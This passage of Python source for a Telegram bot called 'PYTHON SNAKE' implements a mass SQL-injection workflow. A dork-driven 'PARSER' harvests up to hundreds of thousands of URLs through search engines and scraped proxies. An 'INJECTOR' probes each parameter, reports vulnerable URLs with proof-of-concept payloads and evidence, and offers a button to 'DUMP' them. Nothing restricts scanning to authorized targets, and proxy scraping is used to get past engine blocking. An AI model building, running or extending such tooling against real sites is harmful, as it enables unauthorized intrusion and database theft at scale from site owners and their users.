    context.user_data["inj_cat"] = cat if cat in CAT_LABEL else "all"
    return await tool_inj(update, context)


async def cb_inj_go(update, context):
    """🚀 START SCAN — ask for URLs (text or file)."""
    q = update.callback_query
    cat = context.user_data.get("inj_cat", "all")
    last = context.user_data.get("last_urls") or []
    rows = []
    if last:
        rows.append([InlineKeyboardButton("📥 USE LAST %d PARSER URLS" % len(last),
                                          callback_data="inj:last")])
    rows.append([InlineKeyboardButton("⬅️ BACK", callback_data="m:inj")])
    txt = (H("SEND URLS", CAT_LABEL.get(cat, cat)) + "\n\n"
           + B("Paste URLs") + "\n" + P("one per line, or comma separated") + "\n"
           + "<code>https://site.com/page.php?id=5</code>\n\n"
           + B("Or send a file") + "\n" + P(".txt / .csv / .json / .xlsx — every URL inside")
           + "\n\n" + KV("Probes", "<code>%d</code> per parameter" % len(inj_probes_for(cat)), "🔍")
           + "\n" + KV("Max per URL", "<code>%s</code>" % fmt(int(sget("inj_targets", 24) or 24)), "🎯")
           + "\n\n" + P("Only vulnerable URLs come back — clean pages are dropped."))
    try:
        await q.edit_message_text(txt, reply_markup=RK(rows), parse_mode=ParseMode.HTML)
    except Exception:
        pass
    await_set(context, "inj_urls")


async def cb_inj_last(update, context):
    q = update.callback_query
    urls = context.user_data.get("last_urls") or []
    if not urls:
        try:
            await q.answer("Run PARSER first", show_alert=True)
        except Exception:
            pass
        return
    await _run_inject(update, context, urls)


def _urls_from_text(text: str, limit: int = 2000) -> list:
    got = re.findall(r"https?://[^\s,'\"<>)\]]+", str(text or ""))
    return _uniq(got)[:limit]


async def input_inj_urls(update, context, text: str):
    urls = _urls_from_text(text)
    if not urls:
        await reply_msg(update).reply_text(
            "❌ <b>No URLs found.</b>\n\n"
            "Send full URLs, one per line:\n"
            "<code>https://site.com/page.php?id=5</code>\n"
            "<i>Or send a .txt file.</i>", parse_mode=ParseMode.HTML,
            reply_markup=kb_back("m:inj"))
        await_set(context, "inj_urls")
        return
    await _run_inject(update, context, urls)


def _inj_progress_card(st: dict, spin: int) -> str:
    pct = (st["tested"] / max(1, st["total"])) * 100
    took = max(0.001, time.time() - st["start"])
    speed = st["tested"] / took
    left = max(0, st["total"] - st["tested"])
    eta = (left / speed) if speed > 0.05 else 0
    return (H("SCANNING", "%s • %d probes" % (CAT_LABEL.get(st.get("cat"), "ALL"),
                                              len(inj_probes_for(st.get("cat") or "all"))))
            + "\n\n" + bar2(pct, 14, spin) + "\n\n"
            + "◆ URLs       : <code>%s/%s</code>  <i>(kitne sites)</i>\n"
              % (fmt(st["urls_done"]), fmt(st["urls"]))
            + "◆ Requests   : <code>%s/%s</code>  <i>(probe calls)</i>\n"
              % (fmt(st["tested"]), fmt(st["total"]))
            + "◆ Vulnerable : <code>%s</code>%s\n"
              % (fmt(len(st["vulns"])),
                 (" (+%d need verify)" % st["suspected"]) if st.get("suspected") else "")
            + "◆ Blocked    : <code>%s</code>\n" % fmt(st["blocked"])
            + "◆ Speed      : <code>%.1f req/s</code>\n" % speed
            + "◆ ETA        : <code>%s</code>" % (("%.0fs" % eta) if eta else "—"))


def _inj_vuln_lines(vulns, n: int = 6) -> str:
    out = []
    for v in vulns[:n]:
        icon = INJ_STYLE.get(v["type"], "⚠️")
        head = "%s <b>%s</b>%s · param <code>%s</code>" % (
            icon, esc(v["type"]),
            (" · " + esc(v["dbms"])) if v.get("dbms") else "", esc(v["param"]))
        base = v.get("base") or v.get("url") or ""
        out.append(head + "\n<code>%s</code>\n<i>poc: %s → %s</i>"
                   % (esc(base[:160]), esc(str(v.get("payload") or "")[:40]),
                      esc(v.get("evidence") or "")[:70]))
    if len(vulns) > n:
        out.append("<i>+ %d more in the file…</i>" % (len(vulns) - n))
    return "\n\n".join(out)


async def _run_inject(update, context, urls):
    """ASLI scan — inj_scan chalao, live bar2 progress, phir sirf vulnerable."""
    cat = context.user_data.get("inj_cat", "all")
    uid = str(update.effective_user.id)
    ACTIVE_UID["uid"] = update.effective_user.id
    stop_clear(uid)
    tok = stop_mark(uid)
    urls = _uniq([u for u in urls if str(u).startswith("http")])
    msg = await reply_msg(update).reply_text(
        _inj_progress_card({"urls": len(urls), "urls_done": 0, "tested": 0, "total": 0,
                            "vulns": [], "blocked": 0, "start": time.time(), "cat": cat}, 0),
        parse_mode=ParseMode.HTML, reply_markup=kb_stop(uid, tok))
    spin = {"n": 0}
    last = {"t": 0.0}

    async def prog(st):
        if time.time() - last["t"] < 2.0:
            return
        last["t"] = time.time()
        spin["n"] += 1
        try:
            await msg.edit_text(_inj_progress_card(st, spin["n"]),
                                parse_mode=ParseMode.HTML, reply_markup=kb_stop(uid, tok))
        except Exception:
            pass

    st = await inj_scan(urls, cat, progress=prog, uid=uid,
                        timeout=float(sget("inj_timeout", 6) or 6),
                        conc=int(sget("inj_conc", 40) or 40),
                        max_targets=int(sget("inj_targets", 24) or 24))
    vulns = st["vulns"]
    took = st.get("took", 0)
    speed = st["tested"] / max(0.001, took)
    clean = max(0, st["urls_done"] - len({v["base"] for v in vulns}))
    head = ("⚠️ <b>%d vulnerable URL(s) found</b>" % len(vulns)) if vulns else \
        "🛡 <b>No vulnerabilities found</b>"
    body = (H("SQLi SCAN COMPLETE", "%.1fs" % took) + "\n\n"
            + head + "\n"
            + "🌐 URLs scanned: <code>%s</code> (clean <code>%s</code>)\n" % (fmt(st["urls_done"]), fmt(clean))
            + "🧪 Requests: <code>%s</code> · ⚡ <code>%.1f req/s</code>\n" % (fmt(st["tested"]), speed)
            + "🚫 Blocked: <code>%s</code>\n" % fmt(st["blocked"])
            + ("⚠️ Unverified: <code>%s</code> (2nd check fail — confidence low)\n"
               % fmt(st["suspected"]) if st.get("suspected") else "")
            + ("💀 Dead hosts skipped: <code>%s</code>\n" % fmt(len(st.get("dead_hosts") or []))
               if st.get("dead_hosts") else "")
            + ("⛔ Stopped early\n" if st.get("stopped") else "")
            + "\n" + bar2(100, 14, None))
    if vulns:
        if st["by_type"]:
            body += "\n\n" + B("By type") + "\n" + " · ".join(
                "%s %s <code>%s</code>" % (INJ_STYLE.get(k, "•"), esc(k), fmt(v))
                for k, v in sorted(st["by_type"].items(), key=lambda z: -z[1]))
        body += "\n\n" + B("Vulnerable") + "\n" + _inj_vuln_lines(vulns, 6)
    try:
        await msg.delete()
    except Exception:
        pass
    _n_v = len(_uniq([v["base"] for v in vulns])) if vulns else 0
    _rows = []
    if _n_v:
        _rows.append([InlineKeyboardButton("📁 DUMP THESE %d URL(s)" % _n_v,
                                           callback_data="df:frominj")])
    _rows.append([InlineKeyboardButton("⬅️ INJECTOR", callback_data="m:inj")])
    _kb_done = RK(_rows)
    for ch in chunk_lines(body)[:3]:
        await reply_msg(update).reply_text(ch, parse_mode=ParseMode.HTML,
                                           reply_markup=_kb_done)
    if vulns:
        base_urls = _uniq([v["base"] for v in vulns])
        path, cnt = dump_text(base_urls, "vuln_" + str(cat),
                              "PYTHON SNAKE — vulnerable URLs (%s)" % cat)
        await send_file(update, path, "💉 %d vulnerable URL(s)" % cnt)
        rows = ["type,dbms,param,status,url,poc,evidence"]
        for v in vulns:
            rows.append("%s,%s,%s,%s,\"%s\",\"%s\",\"%s\"" % (
                v["type"], v.get("dbms", ""), v["param"], v.get("status", ""),
                v["base"].replace('"', "%22"), v["url"].replace('"', "%22"),
                str(v.get("evidence", "")).replace('"', "'")[:90]))
        csvp = os.path.join(DUMP_DIR, "vuln_report_%s.csv" % stamp())
        with open(csvp, "w", encoding="utf-8") as f:
            f.write("\n".join(rows) + "\n")
        await send_file(update, csvp, "📊 Full report (csv)")
        context.user_data["last_vulns"] = vulns
        context.user_data["inj_confirmed"] = {v["base"]: v["param"] for v in vulns}
    context.user_data["last_inj_stats"] = {k: st[k] for k in
                                           ("tested", "total", "urls", "blocked", "took")}
    context.user_data.pop("inj_pending", None)
    await_clear(context)


# ═══════════════════════════════════════════════════════════════════════════════
#  TOOL: PARSER
# ═══════════════════════════════════════════════════════════════════════════════
async def tool_parse(update, context):
    q = update.callback_query
    last = context.user_data.get("last_dorks") or []
    mode = user_mode(context)
    pool = PROXIES or load_proxy_pool()
    kb = RK([
        [InlineKeyboardButton("🚀 DEEP SCAN (LAST DORKS)", callback_data="pr:deep")],
        [InlineKeyboardButton("📥 USE LAST %d DORKS" % len(last), callback_data="pr:last")],
        [InlineKeyboardButton("✍️ MANUAL DORK", callback_data="pr:manual")],
        [InlineKeyboardButton("🌊 DEEP CRAWL (last URLs)", callback_data="pr:crawl")],
        [InlineKeyboardButton("🎯 URL LIMIT: %s"
                              % ("ALL" if not int(sget("parse_url_limit", 0) or 0)
                                 else fmt(int(sget("parse_url_limit", 0)))),
                              callback_data="pr:limit")],
        [InlineKeyboardButton("🎛 %s" % ENGINE_LABEL[mode].split(" ", 1)[-1],
                              callback_data="pr:eng")],
        [InlineKeyboardButton("⚙️ PARSER SETTINGS (pages / threads / timeout)",
                              callback_data="pr:cfg")],
        [InlineKeyboardButton("⬅️ BACK", callback_data="m:home")],
    ])
    txt = (H("PARSER", "fewer engines = faster", slot="parse") + "\n\n"
           + KV("Mode", "<b>%s</b>" % ENGINE_LABEL[mode], "🎛")
           + "\n" + KV("Engines", "<code>%s</code>" % ", ".join(engine_list(mode)), "⚙️")
           + "\n" + KV("Free Google", "✅ ON (no key)" if gj_enabled() else "⚪ OFF", "🐦")
           + ("\n" + KV("Proxy", ("✅ %d alive" % len(pool)) if pool else "⚪ none — direct mode", "🧅")
              if is_admin(update.effective_user.id) else "")
           + "\n" + KV("Dorks ready", "<code>%s</code>" % fmt(len(last)), "🎯")
           + "\n" + KV("URL limit", ("<b>ALL</b> — as many as found"
                                      if not int(sget("parse_url_limit", 0) or 0)
                                      else "<code>%s</code>" % fmt(int(sget("parse_url_limit", 0)))), "🌐")
           + "\n" + KV("Pages / Threads", "<code>%d</code> · <code>%d</code> parallel"
                       % (int(sget("parse_pages", 1) or 1),
                          int(sget("parse_threads", 6) or 6)), "⚙️")
           + "\n" + KV("Timeout", "<code>%ss</code>" % int(sget("parse_timeout", 0) or
                                                            ENGINE_TIMEOUT.get(mode, 8)), "⏱")
           + "\n\n" + P("DDG Lite • DDG • Bing run fine on mobile data. "
                           "Google and Yandex often block mobile IPs — use fast mode.")
           + "\n\n" + B("Send the dork list") + "\n"
           + P("One per line — or send a file. You can also reuse the last dorks.")
           + "\n\n<code>/engines fast</code> for more speed.")
    try:
        await q.edit_message_text(txt, reply_markup=kb, parse_mode=ParseMode.HTML)
    except Exception:
        pass


async def cb_parse_engine(update, context):
    """PARSER ka mode button — fast → normal → max → fast (per user)."""
    order = ["fast", "normal", "max"]
    cur = user_mode(context)
    nxt = order[(order.index(cur) + 1) % 3] if cur in order else "fast"
    context.user_data["engines_mode"] = nxt
    try:
        await update.callback_query.answer("%s selected — %d engines"
                                           % (ENGINE_LABEL[nxt], len(ENGINE_SETS[nxt])),
                                           show_alert=False)
    except Exception:
        pass
    return await tool_parse(update, context)


async def launch_deep(update, context, dorks, note: str = ""):
    """Bina kuch poochhe — poore dorks + auto URL limit se scan shuru."""
    dorks = _uniq([str(d).strip() for d in (dorks or []) if str(d).strip()])
    if not dorks:
        await reply_msg(update).reply_text("❌ No dorks found. Run DORKER.")
        return
    context.user_data["parse_dorks"] = dorks          # SAARE dorks — koi cap nahi
    if note:
        try:
            await reply_msg(update).reply_text(note, parse_mode=ParseMode.HTML)
        except Exception:
            pass
    await_clear(context)
    return await input_deep_max(update, context, "")


async def cb_parse_last(update, context):
    q = update.callback_query
    dorks = context.user_data.get("last_dorks") or []
    if not dorks:
        try:
            await q.answer("Run DORKER first", show_alert=True)
        except Exception:
            pass
        return
    try:
        await q.answer("Poora scan — %d dorks" % len(dorks))
    except Exception:
        pass
    return await launch_deep(update, context, dorks)


async def cb_parse_limit(update, context):
    """🎯 URL limit cycle — SAB → 5k → 20k → 50k → 1L → SAB."""
    order = [0, 5000, 20000, 50000, 100000]
    try:
        cur = int(sget("parse_url_limit", 0) or 0)
    except Exception:
        cur = 0
    nxt = order[(order.index(cur) + 1) % len(order)] if cur in order else 0
    sset("parse_url_limit", nxt)
    try:
        await update.callback_query.answer("URL limit: %s" % ("ALL (as many as found)" if not nxt else fmt(nxt)))
    except Exception:
        pass
    return await tool_parse(update, context)


PARSER_CYCLES = {
    "pages":   ("parse_pages", [1, 2, 3, 5], "Pages per dork"),
    "threads": ("parse_threads", [2, 3, 4, 6, 8], "Parallel dorks"),
    "timeout": ("parse_timeout", [6, 8, 12, 20], "Engine timeout (s)"),
}


async def cb_parse_cfg(update, context, key: str = ""):
    """⚙️ Parser settings — pages, threads, timeout (user khud badal sakta hai)."""
    q = update.callback_query
    if key in PARSER_CYCLES:
        skey, order, label = PARSER_CYCLES[key]
        try:
            cur = int(sget(skey, order[0]) or order[0])
        except Exception:
            cur = order[0]
        nxt = order[(order.index(cur) + 1) % len(order)] if cur in order else order[0]
        sset(skey, nxt)
        try:
            await q.answer("%s → %s" % (label, nxt))
        except Exception:
            pass
        return await cb_parse_cfg(update, context, "")
    mode = user_mode(context)
    pages = int(sget("parse_pages", 1) or 1)
    threads = int(sget("parse_threads", 6) or 6)
    to = int(sget("parse_timeout", 0) or ENGINE_TIMEOUT.get(mode, 8))
    limit = int(sget("parse_url_limit", 0) or 0)
    rows = [
        [InlineKeyboardButton("📄 PAGES: %d" % pages, callback_data="pr:set:pages"),
         InlineKeyboardButton("🧵 THREADS: %d" % threads, callback_data="pr:set:threads")],
        [InlineKeyboardButton("⏱ TIMEOUT: %ss" % to, callback_data="pr:set:timeout")],
        [InlineKeyboardButton("🎯 URL LIMIT: %s" % ("ALL" if not limit else fmt(limit)),
                              callback_data="pr:limit")],
        [InlineKeyboardButton("🎛 ENGINES: %s" % ENGINE_LABEL[mode].split(" ", 1)[-1],
                              callback_data="pr:eng")],
        [InlineKeyboardButton("⬅️ BACK", callback_data="m:parse")],
    ]
    txt = (H("PARSER SETTINGS", "your own speed") + "\n\n"
           + KV("Pages", "<code>%d</code> — har dork ke kitne result pages" % pages, "📄")
           + "\n" + KV("Threads", "<code>%d</code> — ek saath kitne dorks" % threads, "🧵")
           + "\n" + KV("Timeout", "<code>%ss</code> per engine request" % to, "⏱")
           + "\n" + KV("URL limit", "<b>ALL</b>" if not limit else "<code>%s</code>" % fmt(limit), "🎯")
           + "\n" + KV("Engines", "<b>%s</b>" % ENGINE_LABEL[mode], "🎛")
           + "\n\n" + B("Kya badalna chahiye?") + "\n"
           + P("Zyada threads = zyada speed, par phone/net pe block bhi zyada. "
               "4 se shuru karo, farq na dikhe to 6-8.") + "\n"
           + P("Pages badhao to zyada URLs milte hain, par scan lamba chalta hai.")
           + "\n\n" + P("Tap = next value. Exact number chahiye to /batch se bhi set hota hai."))
    try:
        await q.edit_message_text(txt, reply_markup=RK(rows), parse_mode=ParseMode.HTML)
    except Exception:
        pass


async def cb_parse_manual(update, context):
    q = update.callback_query
    try:
        await q.edit_message_text(H("PARSER — MANUAL") + "\n\nDork(s) bhejo (ek line me ek):",
                                  parse_mode=ParseMode.HTML, reply_markup=kb_back("m:parse"))
    except Exception:
        pass
    await_set(context, "parse_dorks")


async def cb_parse_deep(update, context):
    q = update.callback_query
    dorks = context.user_data.get("last_dorks") or []
    if not dorks:
        try:
            await q.answer("Run DORKER first", show_alert=True)
        except Exception:
            pass
        return
    try:
        await q.answer("Poora scan — %d dorks" % len(dorks))
    except Exception:
        pass
    return await launch_deep(update, context, dorks)


async def input_deep_max(update, context, text: str):
    """text khaali = auto (jitna mile utna). Number diya to wahi limit."""
    import re as _re
    pf = _take_pending(context, "deep_max", "parse_max")
    if pf:
        context.user_data["parse_dorks"] = pf
    dorks = context.user_data.get("parse_dorks") or context.user_data.get("last_dorks") or []
    if not dorks:
        await reply_msg(update).reply_text("❌ No dorks found. Run DORKER.")
        return
    _num = _re.sub(r"[^0-9]", "", text or "")
    if _num:
        mx = max(50, min(200000, int(_num)))
        _auto = False
    else:                                    # koi sawaal nahi — auto max
        mx = parse_url_limit(len(dorks))
        _auto = True
    budget = parse_budget()
    _uid = update.effective_user.id
    ACTIVE_UID["uid"] = _uid
    stop_clear(_uid)
    _tok = stop_mark(_uid)
    msg = await reply_msg(update).reply_text(
        (H("DEEP SCAN", "starting") + "\n\n"
         + KV("Dorks", "<code>%s</code>" % fmt(len(dorks)), "🎯") + "\n"
         + KV("URL limit", "<b>%s</b>" % ("ALL (whatever we get)" if _auto else fmt(mx)), "🌐") + "\n"
         + KV("Time budget", "<code>%.0f min</code>" % (budget / 60), "⏱") + "\n"
         + KV("Mode", "<b>%s</b>" % ENGINE_LABEL.get(user_mode(context), "—"), "⚙️")),
        parse_mode=ParseMode.HTML, reply_markup=kb_stop(_uid, _tok))
    t0 = time.time()
    last = {"t": 0.0}

    async def prog(st):
        if time.time() - last["t"] < 2.0:
            return
        last["t"] = time.time()
        pct = st["scanned"] / max(1, st["total"]) * 100
        pr = st.get("proxy") or {}
        try:
            await msg.edit_text(
                (F("PARSER — RUNNING", "%s" % ENGINE_LABEL.get(st.get("mode", "fast"), "")
                   .split("—")[0].strip()) + "\n" + T()["div"][:22] + "\n\n"
                 + bar_pct(pct, 16) + "\n"
                 + "<code>%s / %s dorks</code>\n\n" % (fmt(st["scanned"]), fmt(st["total"]))
                 + "◆ URLs found  : <code>%s</code>\n" % fmt(st["unique"])
                 + "◆ Raw hits    : <code>%s</code>\n" % fmt(st["raw"])
                 + "◆ Blocked     : <code>%s</code>\n" % fmt(st.get("errors", 0))
                 + "◆ Engines up  : <code>%s/%s</code>\n"
                   % (st.get("engines", 0) - len(st.get("dead") or []), st.get("engines", 0))
                 + "◆ Proxies     : <code>%s/%s</code>\n"
                   % (pr.get("alive", 0), pr.get("pool", 0))
                 + "◆ Speed       : <code>%s dork/s</code>\n" % (st.get("per_dork", 0))
                 + "◆ Time left   : <code>%.0f min</code>"
                   % max(0, (budget - (time.time() - t0)) / 60)),
                parse_mode=ParseMode.HTML, reply_markup=kb_stop(_uid, _tok))
        except Exception:
            pass

    res = await parse_deep(dorks, max_urls=mx, pages=int(sget("parse_pages", 1) or 1),
                           use_proxy=None, progress=prog,
                           mode=user_mode(context), budget=budget)
    took = time.time() - t0
    st = res["stats"]
    urls = res["urls"]
    context.user_data["last_urls"] = urls
    _rest = (st.get("remaining_dorks") or []) if st.get("time_up") else []
    context.user_data["parse_rest"] = _rest
    eng = ", ".join("%s:%d" % (a, b) for a, b in
                    sorted(st["engine_hits"].items(), key=lambda z: -z[1])[:4]) or "—"
    _health = []
    for _e in engine_list(st.get("mode") or "normal"):
        _h = int(st["engine_hits"].get(_e, 0))
        if _h:
            _health.append("✅ %s <code>%s</code>" % (_e, fmt(_h)))
        else:
            _why = engine_reason((ENGINE_LAST.get(_e) or ("", 0))[0]) or "no results"
            _health.append("❌ %s <i>%s</i>" % (_e, esc(_why[:28])))
    health_line = " · ".join(_health[:6])
    card = (H("DEEP PARSER — COMPLETE", "%.1fs" % took) + "\n\n"
            "Scanned: <code>%d/%d</code> dorks\n"
            "Raw URLs: <code>%s</code>\n"
            "Unique URLs: <code>%s</code>\n\n"
            "🌐 Common Crawl: <code>%s</code>\n"
            "🐦 Google (free): <code>%s</code>\n"
            "🔑 API: <code>%s</code>\n"
            "⚙️ Engines: <code>%s</code>\n"
            "🧵 Parallel dorks: <code>%s</code>\n"
            "🔎 %s\n\n"
            "%s\n%s\n%s\n%s\n%s\n\n"
            "[%s] <b>100%%</b>\n\n"
            "📦 <b>Files ready</b>"
            % (st["scanned"], st["total"], fmt(st["raw"]), fmt(st["unique"]),
               fmt(st["cc"]), fmt(st.get("gj", 0)), fmt(st["api"]), esc(eng),
               fmt(st.get("workers", 0)), health_line,
               KV("Engine block", "that is what the 'errors' were — <code>%s</code> (IP/proxy block)" % fmt(st["errors"]), "⚠️"),
               KV("Relaxed", "<code>%s</code> strict attempts returned 0, so it took unfiltered" % fmt(st.get("relaxed", 0)), "⚖️"),
               KV("Filtered", "<code>%s</code> (junk %s • mismatch %s)"
                  % (fmt(st["filtered"]), fmt(st["junk"]), fmt(st["mismatch"])), "🚫"),
               KV("Engines mode", "<b>%s</b> — change it with <code>/engines</code>" % engines_mode(), "🎛"),
               (KV("Stopped", "⛔ you pressed STOP — kept whatever was found", "⛔")
                if st.get("stop") else
                KV("Stopped", "⏱ time budget finished — kept whatever was found", "⏱")
                if st.get("time_up") else
                (KV("Stopped", "🛑 0 URLs after %d dorks — engines blocked" % st["scanned"], "🛑")
                 if st.get("aborted") else KV("Finished", "✅ all %d dorks scanned" % st["scanned"], "✅"))),
               bar(100, 22)))
    try:
        await msg.delete()
    except Exception:
        pass
    _kb_next = None
    if _rest:
        _kb_next = RK([
            [InlineKeyboardButton("▶️ CONTINUE — %d dorks left" % len(_rest),
                                  callback_data="pr:rest")],
            [InlineKeyboardButton("⬅️ PARSER", callback_data="m:parse")],
        ])
    _chunks = chunk_lines(card)[:2]
    for _i, ch in enumerate(_chunks):
        await update.effective_message.reply_text(
            ch, parse_mode=ParseMode.HTML,
            reply_markup=_kb_next if _i == len(_chunks) - 1 else None)
    if urls:
        path, cnt = dump_text(urls, "deep", "PYTHON SNAKE — deep scan")
        await send_file(update, path, "🌐 %d unique URLs" % cnt)
        try:
            js = dump_json({"stats": {k: (v if not isinstance(v, dict) else dict(v))
                                      for k, v in st.items()}, "urls": urls[:5000]}, "deepstats")
            await send_file(update, js, "📊 stats")
        except Exception:
            pass
    else:
        await update.effective_message.reply_text(
            (H("0 URLs", ("stopped after %d dorks" % st["scanned"])
               if st.get("aborted") else "why?") + "\n\n"
             + KV("Mode", "<b>%s</b>" % engines_mode(), "🎛") + "\n"
             + KV("Engine block", "<code>%s</code>" % fmt(st["errors"]), "⚠️") + "\n"
             + KV("Common Crawl", "<code>%s</code>" % fmt(st.get("cc", 0)), "🌐") + "\n"
             + KV("Wayback", "<code>%s</code>" % fmt(st.get("wb", 0)), "🕰") + "\n\n"
             + B("Real reason per engine") + "\n"
             + ("\n".join("❌ <b>%s</b> — <code>%s</code>"
                          % (esc(ENGINE_LABEL.get(e, e)),
                             esc(engine_reason(ENGINE_LAST[e][0]) if e in ENGINE_LAST
                                 else "not tested in this run"))
                          for e in engine_list(user_mode(context))[:6]) or "—")
             + "\n\n" + B("Now do this") + "\n"
             + "1️⃣ <code>/enginetest</code> — which engine works, with the reason\n"
             + "2️⃣ <code>/engines fast</code> — ddgl • ddg • bing\n"
             + (("3️⃣ 🧅 PROXY ENGINE → add proxies (Jio/Airtel can block some engines)\n")
                if is_admin(update.effective_user.id) else
                ("3️⃣ Try again in a few minutes (engines rate-limit)\n"))
             + "4️⃣ Simplify the dork: <code>site:x.in inurl:login</code>\n\n"
             + "<i>Google and Yandex block your IP without a proxy. DDG Lite, DDG and Bing usually work.</i>"),
            parse_mode=ParseMode.HTML, reply_markup=kb_back("m:parse"))
    await update.effective_message.reply_text("⬅️ Menu", reply_markup=kb_back("m:home"))
    await_clear(context)


async def input_parse_dorks(update, context, text: str):
    ok, err = kind_check(text, "dorks", "dorks")
    if not ok:
        await update.effective_message.reply_text(err, parse_mode=ParseMode.HTML,
                                                  reply_markup=kb_back("m:parse"))
        await_set(context, "parse_dorks")
        return
    dorks = []
    for _ln in str(text or "").splitlines():
        _ln = _ln.strip()
        if not _ln:
            continue
        # 1 line = 1 dork. Sirf "|" aur comma+space pe alag karo.
        for _p in re.split(r"\s*\|\s*|,(?=\s)", _ln):
            _p = _p.strip()
            if _p:
                dorks.append(_p)
    dorks = _uniq(dorks)[:20000]                   # 1000 / 10000 — sab chalega
    if not dorks:
        await update.effective_message.reply_text("❌ No dorks found.")
        return
    context.user_data["parse_dorks"] = dorks
    return await launch_deep(update, context, dorks,
                             note="✅ <b>%s dorks</b> found — full scan, no limit."
                                  % fmt(len(dorks)))


async def input_parse_max(update, context, text: str):
    try:
        mx = int(re.sub(r"[^0-9]", "", text) or "100")
    except Exception:
        mx = 100
    mx = max(5, min(20000, mx))
    pf = _take_pending(context, "parse_max", "deep_max")
    if pf:
        context.user_data["parse_dorks"] = pf
    dorks = context.user_data.get("parse_dorks") or context.user_data.get("last_dorks") or []
    if not dorks:
        await update.effective_message.reply_text("❌ No dorks found. Run DORKER.")
        return
    msg = await update.effective_message.reply_text(
        "⏳ Parsing…\n🎯 %d dorks → max %d URLs" % (len(dorks), mx))
    t0 = time.time()
    last = {"t": 0.0}

    async def prog(st):
        if time.time() - last["t"] < 3:
            return
        last["t"] = time.time()
        try:
            await msg.edit_text(
                "🔍 <b>%s</b>\n" % F("PARSING — LIVE", T()["head"]) + T()["div"] +
                "\n🎯 Dorks   : <code>%d/%d</code> %s\n🔗 URLs    : <code>%s</code>\n"
                "⏱ Time    : <code>%.0fs</code>"
                % (st["dorks"], st["total"],
                   bar(st["dorks"] / max(1, st["total"]) * 100),
                   fmt(st["urls"]), time.time() - t0),
                parse_mode=ParseMode.HTML)
        except Exception:
            pass

    res = await parse(dorks, max_urls=mx, pages=sget("parse_pages", 1),
                      use_proxy=None, progress=prog, mode=user_mode(context))
    took = time.time() - t0
    urls = res["urls"]
    context.user_data["last_urls"] = urls
    st = res["stats"]
    if not urls:
        blocked = st["blocked"]
        txt = (H("PARSER — 0 URLs") + "\n\n"
               "❌ Koi URL nahi mila.\n\n"
               "🔍 Queries   : <code>%d</code>\n"
               "🚫 Blocked   : <code>%d</code>\n\n"
               "%s"
               "👉 Make the dork simpler: <code>site:x.in inurl:login</code>\n"
               "👉 Or try again in a few minutes (engine rate-limit)"
               % (st["queries"], blocked,
                  ("🧅 Proxies   : <code>%d</code>\n\n"
                   "👉 <b>Add proxies</b> from 🧅 PROXY ENGINE (admin)\n"
                   % len(PROXIES)) if is_admin(update.effective_user.id) else ""))
    else:
        eng = ", ".join("%s:%d" % (k, v) for k, v in sorted(st["engine_hits"].items(), key=lambda z: -z[1])[:4])
        txt = (H("PARSER — DONE") + "\n\n"
               "🔗 URLs      : <code>%s</code>\n"
               "🎯 Dorks     : <code>%d</code>\n"
               "🔍 Queries   : <code>%d</code>\n"
               "🚫 Blocked   : <code>%d</code>\n"
               "⏱ Time      : <code>%.1fs</code>\n"
               "⚙️ Engines   : <code>%s</code>\n\n%s"
               % (fmt(len(urls)), len(dorks), st["queries"], st["blocked"], took, esc(eng),
                  short_list(urls[:10], 10)))
    try:
        await msg.delete()
    except Exception:
        pass
    for ch in chunk_lines(txt)[:3]:
        await update.effective_message.reply_text(ch, parse_mode=ParseMode.HTML)
    if urls:
        path, cnt = dump_text(urls, "parser", "PYTHON SNAKE — parsed URLs")
        await send_file(update, path, "🔍 %d real URLs" % cnt)
    await update.effective_message.reply_text("⬅️ Menu", reply_markup=kb_back("m:home"))
    await_clear(context)


# ═══════════════════════════════════════════════════════════════════════════════
#  TOOL: PROXY
# ═══════════════════════════════════════════════════════════════════════════════
async def tool_proxy(update, context):
    q = update.callback_query
    if not is_admin(update.effective_user.id):      # proxy scraping = admin only
        try:
            await q.answer("Admin only", show_alert=True)
        except Exception:
            pass
        return
    pool = PROXIES or load_proxy_pool()
    txt = (H("PROXY ENGINE", "%d sources • DoH bypass • %s parallel"
             % (len(PROXY_SOURCES), fmt(sget("concurrency", 400)))) + "\n\n"
           "🧅 Pool now  : <code>%d</code> proxies\n"
           "📄 Manual    : <code>%d</code> (data/manual_proxies.txt)\n"
           "📦 Batch     : <code>%s</code> (set by admin)\n"
           "🎯 Target    : <code>%s</code>\n\n"
           "Start the scan?\n<i>Every proxy is checked in batches — none is skipped.</i>"
           % (len(pool), len(manual_proxies()), fmt(proxy_batch_size()),
              ("all" if not want_alive_n() else fmt(want_alive_n()))))
    kb = RK([
        [InlineKeyboardButton("🚀 SCRAPE + CHECK", callback_data="px:run")],
        [InlineKeyboardButton("📊 POOL STATUS", callback_data="px:stat")],
        [InlineKeyboardButton("🗑 CLEAR", callback_data="px:clear")],
        [InlineKeyboardButton("⬅️ BACK", callback_data="m:home")],
    ])
    try:
        await q.edit_message_text(txt, reply_markup=kb, parse_mode=ParseMode.HTML)
    except Exception:
        pass


async def cb_proxy_run(update, context):
    q = update.callback_query
    t0 = time.time()
    await q.edit_message_text("⏳ <b>Step 1/2</b> — scraping the proxy sources…",
                              parse_mode=ParseMode.HTML)

    async def src_prog(st):
        try:
            await q.edit_message_text(
                "🧅 <b>%s</b>\n" % F("SCRAPING", T()["head"]) + T()["div"] +
                "\n📡 Sources : <code>%d/%d</code> %s\n✅ OK      : <code>%d</code>\n"
                "🔢 Mila    : <code>%s</code>"
                % (st["done"], st["total"], bar(st["done"] / max(1, st["total"]) * 100),
                   st["ok"], fmt(st["px"])), parse_mode=ParseMode.HTML)
        except Exception:
            pass

    px = await scrape_proxies(progress=src_prog, force=True)
    px = _uniq(px + manual_proxies())
    if not px:
        await q.edit_message_text(
            (H("PROXY — 0 FOUND") + "\n\n"
             "❌ Koi source khula hi nahi.\n\n"
             "🌐 Sources : <code>0/%d</code>\n\n"
             "👉 <b>Net/DNS block</b> lag raha hai:\n"
             "• WiFi ↔ mobile data switch karo\n"
             "• Ya <code>data/manual_proxies.txt</code> me proxies daalo\n"
             "   (1 line = 1 proxy, jaise <code>1.2.3.4:8080</code>)"
             % len(PROXY_SOURCES)),
            reply_markup=kb_back("m:proxy"), parse_mode=ParseMode.HTML)
        return

    _pb = proxy_batch_size()
    await q.edit_message_text("⏳ <b>Step 2/2</b> — checking %s proxies…\n"
                              "<i>(batch of %s • agla batch pichle ke baad khud chalu)</i>"
                              % (fmt(len(px)), fmt(_pb)),
                              parse_mode=ParseMode.HTML)

    async def chk_prog(st):
        try:
            await q.edit_message_text(
                "🔍 <b>%s</b>\n" % F("CHECKING", T()["head"]) + T()["div"] +
